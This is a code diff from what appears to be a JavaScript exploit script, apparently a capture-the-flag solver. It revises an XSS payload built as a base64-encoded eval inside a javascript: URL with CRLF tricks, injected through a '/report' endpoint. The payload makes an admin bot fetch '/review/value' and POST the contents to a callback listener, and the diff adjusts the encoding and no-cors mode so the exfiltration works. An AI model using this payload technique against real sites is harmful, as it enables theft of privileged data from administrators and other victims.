@@ -195,9 +195,9 @@ async function recoverThroughApp() {
     });
   });
 
-  const js = `fetch('/review/value').then(r=>r.text()).then(t=>fetch('http://127.0.0.1:${callback.port}${callbackPath}',{method:'POST',headers:{'Content-Type':'text/plain'},body:t}))`;
+  const js = `fetch('/review/value').then(r=>r.text()).then(t=>fetch('http://127.0.0.1:${callback.port}${callbackPath}',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:t}))`;
   const encoded = Buffer.from(js).toString('base64');
-  const payload = `javascript://admin.pk/;%250D%250A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
+  const payload = `javascript://admin.pk/;%0D%0A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
   await request('POST', '/report', {
     body: new URLSearchParams({ parameters: payload }).toString(),
   });
